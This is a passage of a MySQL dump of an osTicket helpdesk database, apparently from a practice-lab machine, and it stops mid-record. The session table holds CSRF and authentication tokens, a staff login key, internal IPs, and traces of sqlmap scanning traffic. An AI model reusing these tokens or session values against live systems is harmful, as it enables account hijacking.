/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_columns` (
  `queue_id` int(11) unsigned NOT NULL,
  `column_id` int(11) unsigned NOT NULL,
  `staff_id` int(11) unsigned NOT NULL,
  `bits` int(10) unsigned NOT NULL DEFAULT 0,
  `sort` int(10) unsigned NOT NULL DEFAULT 1,
  `heading` varchar(64) DEFAULT NULL,
  `width` int(10) unsigned NOT NULL DEFAULT 100,
  PRIMARY KEY (`queue_id`,`column_id`,`staff_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_columns`
--

LOCK TABLES `ost_queue_columns` WRITE;
/*!40000 ALTER TABLE `ost_queue_columns` DISABLE KEYS */;
INSERT INTO `ost_queue_columns` VALUES (1,1,0,1,1,'Ticket',100),(1,3,0,1,3,'Subject',300),(1,4,0,1,4,'From',185),(1,5,0,1,5,'Priority',85),(1,8,0,1,6,'Assigned To',160),(1,10,0,1,2,'Last Updated',150),(2,1,0,1,1,'Ticket',100),(2,3,0,1,3,'Subject',300),(2,4,0,1,4,'From',185),(2,5,0,1,5,'Priority',85),(2,8,0,1,6,'Assigned To',160),(2,10,0,1,2,'Last Updated',150),(3,1,0,1,1,'Ticket',100),(3,3,0,1,3,'Subject',300),(3,4,0,1,4,'From',185),(3,5,0,1,5,'Priority',85),(3,8,0,1,6,'Assigned To',160),(3,10,0,1,2,'Last Updated',150),(4,1,0,1,1,'Ticket',100),(4,3,0,1,3,'Subject',300),(4,4,0,1,4,'From',185),(4,5,0,1,5,'Priority',85),(4,8,0,1,6,'Assigned To',160),(4,9,0,1,9,'Due Date',150),(5,1,0,1,1,'Ticket',100),(5,3,0,1,3,'Subject',300),(5,4,0,1,4,'From',185),(5,5,0,1,5,'Priority',85),(5,10,0,1,2,'Last Update',150),(5,11,0,1,6,'Department',160),(6,1,0,1,1,'Ticket',100),(6,3,0,1,3,'Subject',300),(6,4,0,1,4,'From',185),(6,5,0,1,5,'Priority',85),(6,10,0,1,2,'Last Update',150),(6,11,0,1,6,'Department',160),(7,1,0,1,1,'Ticket',100),(7,3,0,1,3,'Subject',300),(7,4,0,1,4,'From',185),(7,5,0,1,5,'Priority',85),(7,10,0,1,2,'Last Update',150),(7,14,0,1,6,'Team',160),(8,1,0,1,1,'Ticket',100),(8,3,0,1,3,'Subject',300),(8,4,0,1,4,'From',185),(8,7,0,1,2,'Date Closed',150),(8,8,0,1,6,'Closed By',160),(9,1,0,1,1,'Ticket',100),(9,3,0,1,3,'Subject',300),(9,4,0,1,4,'From',185),(9,7,0,1,2,'Date Closed',150),(9,8,0,1,6,'Closed By',160),(10,1,0,1,1,'Ticket',100),(10,3,0,1,3,'Subject',300),(10,4,0,1,4,'From',185),(10,7,0,1,2,'Date Closed',150),(10,8,0,1,6,'Closed By',160),(11,1,0,1,1,'Ticket',100),(11,3,0,1,3,'Subject',300),(11,4,0,1,4,'From',185),(11,7,0,1,2,'Date Closed',150),(11,8,0,1,6,'Closed By',160),(12,1,0,1,1,'Ticket',100),(12,3,0,1,3,'Subject',300),(12,4,0,1,4,'From',185),(12,7,0,1,2,'Date Closed',150),(12,8,0,1,6,'Closed By',160),(13,1,0,1,1,'Ticket',100),(13,3,0,1,3,'Subject',300),(13,4,0,1,4,'From',185),(13,7,0,1,2,'Date Closed',150),(13,8,0,1,6,'Closed By',160),(14,1,0,1,1,'Ticket',100),(14,3,0,1,3,'Subject',300),(14,4,0,1,4,'From',185),(14,7,0,1,2,'Date Closed',150),(14,8,0,1,6,'Closed By',160);
/*!40000 ALTER TABLE `ost_queue_columns` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_config`
--

DROP TABLE IF EXISTS `ost_queue_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_config` (
  `queue_id` int(11) unsigned NOT NULL,
  `staff_id` int(11) unsigned NOT NULL,
  `setting` text DEFAULT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`queue_id`,`staff_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_config`
--

LOCK TABLES `ost_queue_config` WRITE;
/*!40000 ALTER TABLE `ost_queue_config` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_queue_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_export`
--

DROP TABLE IF EXISTS `ost_queue_export`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_export` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `queue_id` int(11) unsigned NOT NULL,
  `path` varchar(64) NOT NULL DEFAULT '',
  `heading` varchar(64) DEFAULT NULL,
  `sort` int(10) unsigned NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`),
  KEY `queue_id` (`queue_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_export`
--

LOCK TABLES `ost_queue_export` WRITE;
/*!40000 ALTER TABLE `ost_queue_export` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_queue_export` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_sort`
--

DROP TABLE IF EXISTS `ost_queue_sort`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_sort` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `root` varchar(32) DEFAULT NULL,
  `name` varchar(64) NOT NULL DEFAULT '',
  `columns` text DEFAULT NULL,
  `updated` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_sort`
--

LOCK TABLES `ost_queue_sort` WRITE;
/*!40000 ALTER TABLE `ost_queue_sort` DISABLE KEYS */;
INSERT INTO `ost_queue_sort` VALUES (1,NULL,'Priority + Most Recently Updated','[\"-cdata__priority\",\"-lastupdate\"]','2020-12-26 09:14:00'),(2,NULL,'Priority + Most Recently Created','[\"-cdata__priority\",\"-created\"]','2020-12-26 09:14:00'),(3,NULL,'Priority + Due Date','[\"-cdata__priority\",\"-est_duedate\"]','2020-12-26 09:14:00'),(4,NULL,'Due Date','[\"-est_duedate\"]','2020-12-26 09:14:00'),(5,NULL,'Closed Date','[\"-closed\"]','2020-12-26 09:14:00'),(6,NULL,'Create Date','[\"-created\"]','2020-12-26 09:14:00'),(7,NULL,'Update Date','[\"-lastupdate\"]','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_queue_sort` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_queue_sorts`
--

DROP TABLE IF EXISTS `ost_queue_sorts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_queue_sorts` (
  `queue_id` int(11) unsigned NOT NULL,
  `sort_id` int(11) unsigned NOT NULL,
  `bits` int(11) unsigned NOT NULL DEFAULT 0,
  `sort` int(10) unsigned NOT NULL DEFAULT 0,
  PRIMARY KEY (`queue_id`,`sort_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_queue_sorts`
--

LOCK TABLES `ost_queue_sorts` WRITE;
/*!40000 ALTER TABLE `ost_queue_sorts` DISABLE KEYS */;
INSERT INTO `ost_queue_sorts` VALUES (1,1,0,0),(1,2,0,0),(1,3,0,0),(1,4,0,0),(1,6,0,0),(1,7,0,0),(5,1,0,0),(5,2,0,0),(5,3,0,0),(5,4,0,0),(5,6,0,0),(5,7,0,0),(6,1,0,0),(6,2,0,0),(6,3,0,0),(6,4,0,0),(6,6,0,0),(6,7,0,0),(7,1,0,0),(7,2,0,0),(7,3,0,0),(7,4,0,0),(7,6,0,0),(7,7,0,0),(8,1,0,0),(8,2,0,0),(8,3,0,0),(8,4,0,0),(8,5,0,0),(8,6,0,0),(8,7,0,0),(9,1,0,0),(9,2,0,0),(9,3,0,0),(9,4,0,0),(9,5,0,0),(9,6,0,0),(9,7,0,0),(10,1,0,0),(10,2,0,0),(10,3,0,0),(10,4,0,0),(10,5,0,0),(10,6,0,0),(10,7,0,0),(11,1,0,0),(11,2,0,0),(11,3,0,0),(11,4,0,0),(11,5,0,0),(11,6,0,0),(11,7,0,0),(12,1,0,0),(12,2,0,0),(12,3,0,0),(12,4,0,0),(12,5,0,0),(12,6,0,0),(12,7,0,0),(13,1,0,0),(13,2,0,0),(13,3,0,0),(13,4,0,0),(13,5,0,0),(13,6,0,0),(13,7,0,0),(14,1,0,0),(14,2,0,0),(14,3,0,0),(14,4,0,0),(14,5,0,0),(14,6,0,0),(14,7,0,0);
/*!40000 ALTER TABLE `ost_queue_sorts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_role`
--

DROP TABLE IF EXISTS `ost_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_role` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `flags` int(10) unsigned NOT NULL DEFAULT 1,
  `name` varchar(64) DEFAULT NULL,
  `permissions` text DEFAULT NULL,
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_role`
--

LOCK TABLES `ost_role` WRITE;
/*!40000 ALTER TABLE `ost_role` DISABLE KEYS */;
INSERT INTO `ost_role` VALUES (1,1,'All Access','{\"ticket.assign\":1,\"ticket.close\":1,\"ticket.create\":1,\"ticket.delete\":1,\"ticket.edit\":1,\"thread.edit\":1,\"ticket.link\":1,\"ticket.markanswered\":1,\"ticket.merge\":1,\"ticket.reply\":1,\"ticket.refer\":1,\"ticket.release\":1,\"ticket.transfer\":1,\"task.assign\":1,\"task.close\":1,\"task.create\":1,\"task.delete\":1,\"task.edit\":1,\"task.reply\":1,\"task.transfer\":1,\"canned.manage\":1}','Role with unlimited access','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,1,'Expanded Access','{\"ticket.assign\":1,\"ticket.close\":1,\"ticket.create\":1,\"ticket.edit\":1,\"ticket.link\":1,\"ticket.merge\":1,\"ticket.reply\":1,\"ticket.refer\":1,\"ticket.release\":1,\"ticket.transfer\":1,\"task.assign\":1,\"task.close\":1,\"task.create\":1,\"task.edit\":1,\"task.reply\":1,\"task.transfer\":1,\"canned.manage\":1}','Role with expanded access','2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,1,'Limited Access','{\"ticket.assign\":1,\"ticket.create\":1,\"ticket.link\":1,\"ticket.merge\":1,\"ticket.refer\":1,\"ticket.release\":1,\"ticket.transfer\":1,\"task.assign\":1,\"task.reply\":1,\"task.transfer\":1}','Role with limited access','2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,1,'View only',NULL,'Simple role with no permissions','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_schedule`
--

DROP TABLE IF EXISTS `ost_schedule`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_schedule` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `flags` int(11) unsigned NOT NULL DEFAULT 0,
  `name` varchar(255) NOT NULL,
  `timezone` varchar(64) DEFAULT NULL,
  `description` varchar(255) NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_schedule`
--

LOCK TABLES `ost_schedule` WRITE;
/*!40000 ALTER TABLE `ost_schedule` DISABLE KEYS */;
INSERT INTO `ost_schedule` VALUES (1,1,'Monday - Friday 8am - 5pm with U.S. Holidays',NULL,'','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,1,'24/7',NULL,'','2020-12-26 09:14:00','2020-12-26 09:14:00'),(3,1,'24/5',NULL,'','2020-12-26 09:14:00','2020-12-26 09:14:00'),(4,0,'U.S. Holidays',NULL,'','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_schedule` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_schedule_entry`
--

DROP TABLE IF EXISTS `ost_schedule_entry`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_schedule_entry` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `schedule_id` int(11) unsigned NOT NULL DEFAULT 0,
  `flags` int(11) unsigned NOT NULL DEFAULT 0,
  `sort` tinyint(3) unsigned NOT NULL DEFAULT 0,
  `name` varchar(255) NOT NULL,
  `repeats` varchar(16) NOT NULL DEFAULT 'never',
  `starts_on` date DEFAULT NULL,
  `starts_at` time DEFAULT NULL,
  `ends_on` date DEFAULT NULL,
  `ends_at` time DEFAULT NULL,
  `stops_on` datetime DEFAULT NULL,
  `day` tinyint(4) DEFAULT NULL,
  `week` tinyint(4) DEFAULT NULL,
  `month` tinyint(4) DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `schedule_id` (`schedule_id`),
  KEY `repeats` (`repeats`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_schedule_entry`
--

LOCK TABLES `ost_schedule_entry` WRITE;
/*!40000 ALTER TABLE `ost_schedule_entry` DISABLE KEYS */;
INSERT INTO `ost_schedule_entry` VALUES (1,1,0,0,'Monday','weekly','2019-01-07','08:00:00','2019-01-07','17:00:00',NULL,1,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(2,1,0,0,'Tuesday','weekly','2019-01-08','08:00:00','2019-01-08','17:00:00',NULL,2,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(3,1,0,0,'Wednesday','weekly','2019-01-09','08:00:00','2019-01-09','17:00:00',NULL,3,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(4,1,0,0,'Thursday','weekly','2019-01-10','08:00:00','2019-01-10','17:00:00',NULL,4,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(5,1,0,0,'Friday','weekly','2019-01-11','08:00:00','2019-01-11','17:00:00',NULL,5,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(6,2,0,0,'Daily','daily','2019-01-01','00:00:00','2019-01-01','23:59:59',NULL,NULL,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(7,3,0,0,'Weekdays','weekdays','2019-01-01','00:00:00','2019-01-01','23:59:59',NULL,NULL,NULL,NULL,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(8,4,0,0,'New Year\'s Day','yearly','2019-01-01','00:00:00','2019-01-01','23:59:59',NULL,1,NULL,1,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(9,4,0,0,'MLK Day','yearly','2019-01-21','00:00:00','2019-01-21','23:59:59',NULL,1,3,1,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(10,4,0,0,'Memorial Day','yearly','2019-05-27','00:00:00','2019-05-27','23:59:59',NULL,1,-1,5,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(11,4,0,0,'Independence Day (4th of July)','yearly','2019-07-04','00:00:00','2019-07-04','23:59:59',NULL,4,NULL,7,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(12,4,0,0,'Labor Day','yearly','2019-09-02','00:00:00','2019-09-02','23:59:59',NULL,1,1,9,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(13,4,0,0,'Indigenous Peoples\' Day (Whodat Columbus)','yearly','2019-10-14','00:00:00','2019-10-14','23:59:59',NULL,1,2,10,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(14,4,0,0,'Veterans Day','yearly','2019-11-11','00:00:00','2019-11-11','23:59:59',NULL,11,NULL,11,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(15,4,0,0,'Thanksgiving Day','yearly','2019-11-28','00:00:00','2019-11-28','23:59:59',NULL,4,4,11,'0000-00-00 00:00:00','2020-12-26 09:14:00'),(16,4,0,0,'Christmas Day','yearly','2019-11-25','00:00:00','2019-11-25','23:59:59',NULL,25,NULL,12,'0000-00-00 00:00:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_schedule_entry` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_sequence`
--

DROP TABLE IF EXISTS `ost_sequence`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_sequence` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(64) DEFAULT NULL,
  `flags` int(10) unsigned DEFAULT NULL,
  `next` bigint(20) unsigned NOT NULL DEFAULT 1,
  `increment` int(11) DEFAULT 1,
  `padding` char(1) DEFAULT '0',
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_sequence`
--

LOCK TABLES `ost_sequence` WRITE;
/*!40000 ALTER TABLE `ost_sequence` DISABLE KEYS */;
INSERT INTO `ost_sequence` VALUES (1,'General Tickets',1,1,1,'0','0000-00-00 00:00:00'),(2,'Tasks Sequence',1,1,1,'0','0000-00-00 00:00:00');
/*!40000 ALTER TABLE `ost_sequence` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_session`
--

DROP TABLE IF EXISTS `ost_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_session` (
  `session_id` varchar(255) CHARACTER SET ascii NOT NULL DEFAULT '',
  `session_data` blob DEFAULT NULL,
  `session_expire` datetime DEFAULT NULL,
  `session_updated` datetime DEFAULT NULL,
  `user_id` varchar(16) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0' COMMENT 'osTicket staff/client ID',
  `user_ip` varchar(64) COLLATE utf8_unicode_ci NOT NULL,
  `user_agent` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`session_id`),
  KEY `updated` (`session_updated`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_session`
--

LOCK TABLES `ost_session` WRITE;
/*!40000 ALTER TABLE `ost_session` DISABLE KEYS */;
INSERT INTO `ost_session` VALUES ('0dru7ff2d0a9lqc4t6r0drns1b','csrf|N;','2021-01-31 16:59:34',NULL,'0','10.10.14.52','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'),('5bpb19tiondobh2l2gkc3q939d','csrf|a:2:{s:5:\"token\";s:40:\"2f43e743ead3a56549aa649bd86b9a6b6f2fd39d\";s:4:\"time\";i:1612044591;}captcha|s:32:\"40dbf02591360025543a3f1869dda2f7\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:11;s:3:\"key\";s:11:\"authlink:11\";}s:11:\"user-ticket\";s:7:\"1316174\";}:token|a:1:{s:6:\"client\";s:76:\"5e2c9f48d8abec4774fe8ec70194d9b3:1612044591:b438dd59aef707a6db822b29e76e1121\";}','2021-01-31 17:09:51',NULL,'0','10.10.14.44','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36'),('5f02i6hkm9mn773lq6d3jgolsd','csrf|a:2:{s:5:\"token\";s:40:\"5e768679e687d4f0f5d07974aa390381bcde8707\";s:4:\"time\";i:1612044337;}','2021-01-31 17:05:37',NULL,'0','10.10.14.157','sqlmap/1.4.8.11#dev (http://sqlmap.org)'),('78kfqa1ustk56th2clqeb9psfi','csrf|a:2:{s:5:\"token\";s:40:\"2364f9a2ec5977b9cc8ed88c9167f6d2eb50d4ac\";s:4:\"time\";i:1608998396;}_staff|a:1:{s:4:\"auth\";a:2:{s:4:\"dest\";s:5:\"/scp/\";s:3:\"msg\";s:23:\"Authentication Required\";}}_auth|a:2:{s:5:\"staff\";a:3:{s:2:\"id\";i:1;s:3:\"key\";s:19:\"local:maildeliverer\";s:3:\"2fa\";N;}s:4:\"user\";N;}:token|a:1:{s:5:\"staff\";s:76:\"6f1758b98c62378cf82a4f8955220aec:1608998394:76131d2089f4125f89547767159bb5d3\";}::Q:T|i:1;sort|a:1:{i:1;a:2:{s:9:\"queuesort\";O:9:\"QueueSort\":7:{s:8:\"_columns\";a:2:{s:15:\"cdata__priority\";b:1;s:10:\"lastupdate\";b:1;}s:6:\"_extra\";N;s:2:\"ht\";a:5:{s:2:\"id\";i:1;s:4:\"root\";N;s:4:\"name\";s:32:\"Priority + Most Recently Updated\";s:7:\"columns\";s:34:\"[\"-cdata__priority\",\"-lastupdate\"]\";s:7:\"updated\";s:19:\"2020-12-26 09:14:00\";}s:5:\"dirty\";a:0:{}s:7:\"__new__\";b:0;s:11:\"__deleted__\";b:0;s:12:\"__deferred__\";a:0:{}}s:3:\"dir\";i:0;}}cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}qcounts|a:1:{s:48:\"counts.queues.1.nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3\";a:2:{s:6:\"counts\";a:14:{s:2:\"q1\";d:1;s:2:\"q2\";d:1;s:2:\"q6\";d:0;s:2:\"q9\";d:0;s:2:\"q3\";d:0;s:2:\"q7\";d:0;s:3:\"q10\";d:0;s:2:\"q4\";d:0;s:2:\"q5\";d:0;s:3:\"q11\";d:0;s:2:\"q8\";d:0;s:3:\"q12\";d:0;s:3:\"q13\";d:0;s:3:\"q14\";d:0;}s:4:\"time\";i:1608998394;}}lastcroncall|i:1608998394;::Q:A|s:0:\"\";:QA::sort|a:2:{i:0;s:7:\"created\";i:1;i:0;}:Q:tasks|C:8:\"QuerySet\":2559:{a:16:{s:5:\"model\";s:4:\"Task\";s:11:\"constraints\";a:2:{i:0;C:1:\"Q\":106:{a:3:{i:0;i:0;i:1;i:0;i:2;a:1:{i:0;C:1:\"Q\":57:{a:3:{i:0;i:0;i:1;i:0;i:2;a:1:{s:13:\"flags__hasbit\";i:1;}}}}}}i:1;C:1:\"Q\":383:{a:3:{i:0;i:0;i:1;i:0;i:2;a:1:{i:0;C:1:\"Q\":333:{a:3:{i:0;i:0;i:1;i:2;i:2;a:3:{i:0;C:1:\"Q\":76:{a:3:{i:0;i:0;i:1;i:0;i:2;a:2:{s:13:\"flags__hasbit\";i:1;s:8:\"staff_id\";i:1;}}}i:1;C:1:\"Q\":100:{a:3:{i:0;i:0;i:1;i:0;i:2;a:2:{s:16:\"ticket__staff_id\";i:1;s:21:\"ticket__status__state\";s:4:\"open\";}}}i:2;C:1:\"Q\":73:{a:3:{i:0;i:0;i:1;i:0;i:2;a:1:{s:11:\"dept_id__in\";a:2:{i:0;i:1;i:1;i:3;}}}}}}}}}}}s:16:\"path_constraints\";a:0:{}s:8:\"ordering\";a:1:{i:0;s:8:\"-created\";}s:7:\"related\";b:0;s:6:\"values\";a:13:{s:2:\"id\";s:2:\"id\";s:6:\"number\";s:6:\"number\";s:7:\"created\";s:7:\"created\";s:8:\"staff_id\";s:8:\"staff_id\";s:7:\"team_id\";s:7:\"team_id\";s:16:\"staff__firstname\";s:16:\"staff__firstname\";s:15:\"staff__lastname\";s:15:\"staff__lastname\";s:10:\"team__name\";s:10:\"team__name\";s:10:\"dept__name\";s:10:\"dept__name\";s:12:\"cdata__title\";s:12:\"cdata__title\";s:5:\"flags\";s:5:\"flags\";s:14:\"ticket__number\";s:14:\"ticket__number\";s:17:\"ticket__ticket_id\";s:17:\"ticket__ticket_id\";}s:5:\"defer\";a:0:{}s:10:\"aggregated\";b:0;s:11:\"annotations\";a:3:{s:12:\"collab_count\";O:12:\"SqlAggregate\":5:{s:4:\"func\";s:5:\"COUNT\";s:4:\"expr\";s:21:\"thread__collaborators\";s:8:\"distinct\";b:1;s:10:\"constraint\";b:0;s:5:\"alias\";s:12:\"collab_count\";}s:16:\"attachment_count\";O:12:\"SqlAggregate\":5:{s:4:\"func\";s:5:\"COUNT\";s:4:\"expr\";O:7:\"SqlCase\":5:{s:5:\"cases\";a:1:{i:0;a:2:{i:0;O:8:\"SqlField\":5:{s:5:\"level\";i:0;s:8:\"operator\";N;s:8:\"operands\";N;s:5:\"alias\";N;s:5:\"field\";s:36:\"thread__entries__attachments__inline\";}i:1;N;}}s:4:\"else\";O:8:\"SqlField\":5:{s:5:\"level\";i:0;s:8:\"operator\";N;s:8:\"operands\";N;s:5:\"alias\";N;s:5:\"field\";s:28:\"thread__entries__attachments\";}s:5:\"alias\";N;s:4:\"func\";s:4:\"CASE\";s:4:\"args\";a:0:{}}s:8:\"distinct\";b:1;s:10:\"constraint\";b:0;s:5:\"alias\";s:16:\"attachment_count\";}s:12:\"thread_count\";O:12:\"SqlAggregate\":5:{s:4:\"func\";s:5:\"COUNT\";s:4:\"expr\";O:7:\"SqlCase\":5:{s:5:\"cases\";a:1:{i:0;a:2:{i:0;C:1:\"Q\":74:{a:3:{i:0;i:0;i:1;i:0;i:2;a:1:{s:30:\"thread__entries__flags__hasbit\";i:4;}}}i:1;N;}}s:4:\"else\";O:8:\"SqlField\":5:{s:5:\"level\";i:0;s:8:\"operator\";N;s:8:\"operands\";N;s:5:\"alias\";N;s:5:\"field\";s:19:\"thread__entries__id\";}s:5:\"alias\";N;s:4:\"func\";s:4:\"CASE\";s:4:\"args\";a:0:{}}s:8:\"distinct\";b:1;s:10:\"constraint\";b:0;s:5:\"alias\";s:12:\"thread_count\";}}s:5:\"extra\";a:0:{}s:8:\"distinct\";a:0:{}s:4:\"lock\";b:0;s:5:\"chain\";a:0:{}s:7:\"options\";a:0:{}s:4:\"iter\";i:2;s:8:\"compiler\";s:13:\"MySqlCompiler\";}}:Q:users|C:8:\"QuerySet\":771:{a:16:{s:5:\"model\";s:4:\"User\";s:11:\"constraints\";a:0:{}s:16:\"path_constraints\";a:0:{}s:8:\"ordering\";a:1:{i:0;s:4:\"name\";}s:7:\"related\";b:0;s:6:\"values\";a:7:{s:2:\"id\";s:2:\"id\";s:4:\"name\";s:4:\"name\";s:22:\"default_email__address\";s:22:\"default_email__address\";s:11:\"account__id\";s:11:\"account__id\";s:15:\"account__status\";s:15:\"account__status\";s:7:\"created\";s:7:\"created\";s:7:\"updated\";s:7:\"updated\";}s:5:\"defer\";a:0:{}s:10:\"aggregated\";b:0;s:11:\"annotations\";a:1:{s:12:\"ticket_count\";O:12:\"SqlAggregate\":5:{s:4:\"func\";s:5:\"COUNT\";s:4:\"expr\";s:7:\"tickets\";s:8:\"distinct\";b:0;s:10:\"constraint\";b:0;s:5:\"alias\";s:12:\"ticket_count\";}}s:5:\"extra\";a:0:{}s:8:\"distinct\";a:0:{}s:4:\"lock\";b:0;s:5:\"chain\";a:0:{}s:7:\"options\";a:0:{}s:4:\"iter\";i:2;s:8:\"compiler\";s:13:\"MySqlCompiler\";}}','2020-12-27 10:59:56',NULL,'1','172.16.10.141','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'),('7op9p39fvh9bvahrdqitvf0tqh','csrf|a:2:{s:5:\"token\";s:40:\"62a5fa70a99936d3a8cb695e88f9496020cc23fb\";s:4:\"time\";i:1609844800;}captcha|s:32:\"6bd97cac37962d7e27d4f933602cd64d\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:4;s:3:\"key\";s:10:\"authlink:4\";}s:11:\"user-ticket\";s:7:\"4120849\";}:token|a:1:{s:6:\"client\";s:76:\"5d907ecb69175fe43c639cc4de62624e:1609844800:3f4c7a2a129c29be1c242fddd5f95cab\";}','2021-01-06 06:06:40',NULL,'0','10.10.14.2','python-requests/2.24.0'),('86pq91v2m0p13e60mni2898ihr','csrf|a:2:{s:5:\"token\";s:40:\"75a0d4691d0a49bacc1887f4ac9b9123e769533d\";s:4:\"time\";i:1612044318;}','2021-01-31 17:05:18',NULL,'0','10.10.14.157','sqlmap/1.4.8.11#dev (http://sqlmap.org)'),('a7l170hmrmk5pple1e8jmlnt0q','csrf|a:2:{s:5:\"token\";s:40:\"9918f3d3730c8a2c83ae3e1e4fd6dedb3c549695\";s:4:\"time\";i:1609000222;}_staff|a:1:{s:4:\"auth\";a:2:{s:4:\"dest\";s:14:\"/scp/index.php\";s:3:\"msg\";s:23:\"Authentication 